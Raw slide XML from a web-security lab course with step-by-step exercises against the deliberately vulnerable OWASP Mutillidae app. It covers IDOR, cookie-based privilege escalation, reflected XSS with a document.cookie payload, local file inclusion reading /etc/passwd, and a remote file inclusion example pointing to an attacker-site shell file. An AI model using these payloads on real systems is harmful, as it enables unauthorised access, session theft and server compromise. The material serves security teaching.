              <a:t>dir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command output appears on the webpage, proving that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 input can execute system </a:t>
            </a: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commands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en-US" sz="2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Command Injection confirmed</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" alt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2440078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525"/>
            <a:ext cx="8258175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5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15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15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15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15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15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15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</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US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03</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="3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0914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525"/>
            <a:ext cx="10201275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Task 03: Broken Access Control &amp; IDOR </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Test if you can access data that doesn't belong to you by changing identifiers. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Perform </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> test: Change </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> in a request to access another user's data. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0" smtClean="0"/>
              <a:t>Test </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>: Can a "Viewer" become an "Admin" by changing a cookie value (e.g., role=user to role=admin)? </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0" fontAlgn="base">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> Understand that logic flaws are often more dangerous than technical bugs. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone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36565661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-9526"/>
            <a:ext cx="12192000" cy="68675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Part </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>1 Perform an </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>IDOR</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> test: Change </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t> in a request to access another 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user's </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>data. 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b="1" dirty="0"/>
              <a:t>Step 1 — Open the IDOR </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Lab (</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Mutillidae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>)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Navigate to:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>OWASP Top 10 → A4 - Insecure Direct Object References → Text File Viewer</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Step 2 — Capture the Request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Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Go to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Proxy → Intercept</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Turn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0"/>
              <a:t>Intercept ON</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Load the page in the browser.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Example request:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>mutillidae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>index.php?page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>user-info.php&amp;user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>=1 HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Host: &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1"/>
              <a:t>metasploitable-ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean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4895805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697029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Step 3 — Modify the Identifier</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Change the </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> value.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GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>mutillidae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>index.php?page</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>user-info.php&amp;user_id</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>=2 HTTP/1.1</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Step 4 — Forward the Request</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Forward</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> in Burp Suite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Step 5 — Observe the Response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If the application returns another user's data, for example:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Username: Alice</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Email: alice@example.com</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:lnSpc>
                <a:spcPct val="150000"/>
              </a:lnSpc>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>then the application is vulnerable to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>IDOR (Insecure Direct Object Reference)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> because changing the identifier allowed access to another user's information.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:endParaRPr lang="en-US" sz="15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1875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525"/>
            <a:ext cx="5805714" cy="68675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Part 2</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Step 1 — Log in as a Normal User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Log in to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>OWASP </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" err="1" smtClean="0"/>
              <a:t>Mutillidae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t> II</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> using a normal user account (Viewer).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Step 2 — Capture the Request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Open </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Burp Suite</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Go to </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Proxy → Intercept</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Turn </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" b="1" dirty="0" smtClean="0"/>
              <a:t>Intercept ON</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" lvl="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Refresh a page after login.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Example intercepted request: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 smtClean="0"/>
              <a:t>GET /</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>mutillidae</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>index.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t> HTTP/1.1</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Host: &lt;</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" err="1" smtClean="0"/>
              <a:t>metasploitable-ip</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>&gt;</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0" smtClean="0"/>
              <a:t>Cookie: role=user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sz="2000" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Rectangle 1"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4929414" y="2208893"/>
            <a:ext cx="4992914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Step 3 — Modify the Cookie Value</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" sz="2200" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Change the role value.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Example modification:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Cookie: role=admin</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="37408870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525"/>
            <a:ext cx="10203543" cy="58732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Step 4 — Forward the Request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Click </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Forward</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t> in Burp Suite to send the modified request.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Step 5 — Observe the Result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If the application grants access to admin functionality (e.g., admin panel or additional features), this confirms </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" b="1" dirty="0"/>
              <a:t>Privilege Escalation</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>, because the server trusted the modified cookie value.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Example response:</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>Admin Panel</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>User Management</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
            </a:br>
            <a:r>
              <a:rPr lang="en-US" sz="2200" dirty="0"/>
              <a:t>System Settings</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone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27273345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525"/>
            <a:ext cx="8258175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5000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US" sz="5000" dirty="0" smtClean="0"/>
          </a:p>
          <a:p>
            <a:pPr marL="0" indent="0">
              <a:buNone/>
            </a:pPr>
            <a:endParaRPr lang="en-US"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5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TASK 4</a:t>
            </a:r>
            <a:endParaRPr sz="5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4537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3335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Task 04: Cross-Site Scripting (XSS) &amp; File Inclusion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25563"/>
            <a:ext cx="10515600" cy="4351338"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Description:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> Execute code in the user's browser and read internal server files. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Technical Requirements: </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Find a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Reflected XSS</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> vulnerability and trigger alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0" err="1"/>
              <a:t>document.cookie</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>). </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Test for </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Local File Inclusion (LFI)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> by reading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passwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> or win.ini. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>○ Understand the risk of </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Remote File Inclusion (RFI)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>. </a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="0" fontAlgn="base"/>
            <a:r>
              <a:rPr lang="en-US" b="1" dirty="0"/>
              <a:t>Learning Goal:</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t> See how client-side attacks lead to session hijacking and server-side attacks to data disclosure.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1115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0" y="0"/>
            <a:ext cx="4514850" cy="6432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Part 1 — Reflected XSS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Berlin Sans FB Demi" panose="020E0802020502020306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1 — Open the XSS Lab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Navigate to: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OWASP Top 10 → A2 - Cross Site Scripting (XSS)</a:t>
            </a:r>
            <a:b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→ Reflected XSS</a:t>
            </a:r>
            <a:b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→ DNS Lookup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 page contains a search/input field.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rgbClr val="1F4D78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2 — Enter XSS Payload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Input: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&lt;script&gt;alert(</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2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document.cookie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)&lt;/script&gt;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Click </a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" altLang="en-US" sz="2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Lookup DNS</a:t>
            </a:r>
            <a:r>
              <a:rPr kumimoji="0" lang="en-US" alt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 dirty="0" smtClean="0"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14850" y="0"/>
            <a:ext cx="6096000" cy="290727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1F4D78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3 — Observe the Result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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If a popup appears showing the cookie:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="22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PHPSESSID=abc123</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="22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Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This confirms </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Reflected XSS vulnerability</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" dirty="0"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altLang="en-US" sz="22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latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This demonstrates how attackers can </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>steal session cookies</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2200" dirty="0"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altLang="en-US" sz="2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5611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114" y="0"/>
            <a:ext cx="4223657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70C0"/>
                </a:solidFill>
              </a:rPr>
              <a:t>Part 2 — Local File Inclusion (LFI)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1F4D78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1 — Open the File Inclusion Lab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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Navigate to:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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OWASP Top 10 → A4 - Insecure Direct Object </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0" smtClean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References → </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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Arbitrary File Inclusion</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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  <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>The page loads files using a parameter.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  <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Example URL:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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http://&lt;metasploitable-ip&gt;/mutillidae/index.php?page=home.php</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> 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4731657" y="0"/>
            <a:ext cx="669108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7F4176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2 — Modify the Parameter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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Replace the file name with a </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="FFC000"/>
                </a:solidFill>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>system file.</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="2000" dirty="0">
              <a:solidFill>
                <a:srgbClr val="FFC00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  <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Example:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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?page=/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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etc</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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passwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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  <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Modified URL: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http://&lt;metasploitable-ip&gt;/mutillidae/index.php?page=/etc/passwd</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> 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1F4D78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Step 3 — Observe the Output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ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>If vulnerable, the server returns:</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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root:x:0:0:root:/root:/bin/bash</a:t>
            </a:r>
            <a:br>
              <a:rPr lang="en-US" altLang="en-US" sz="20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20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daemon:x:1:1:daemon:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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sbin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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:/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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usr</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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/</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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sbin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="20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/nologin</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"/>
              <a:t> </a:t>
            </a:r>
            <a:endParaRPr lang="en-US" altLang="en-US" sz="20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  <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>This confirms </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:latin typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
                <a:ea typeface="Times New Roman" panose="02020603050405020304" pitchFamily="18" charset="0"/>
              </a:rPr>
              <a:t>Local File Inclusion (LFI)</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" dirty="0"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5475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0" y="0"/>
            <a:ext cx="10020300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Part 3 — Understand Remote File Inclusion (RFI)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 File Inclusion occurs when the application loads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external files from remote servers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vulnerable parameter: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?page=http://attacker-site.com/shell.txt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If allowed, the server downloads and executes the remote file.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could lead to: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 code execution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shells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 server compromise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>
                <a:solidFill>
                  <a:srgbClr val="991793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🔴</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
                <a:solidFill>
                  <a:srgbClr val="99179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sz="2000" b="1" dirty="0" smtClean="0">
                <a:solidFill>
                  <a:srgbClr val="99179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Remote </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="en-US" altLang="en-US" sz="2000" b="1" dirty="0">
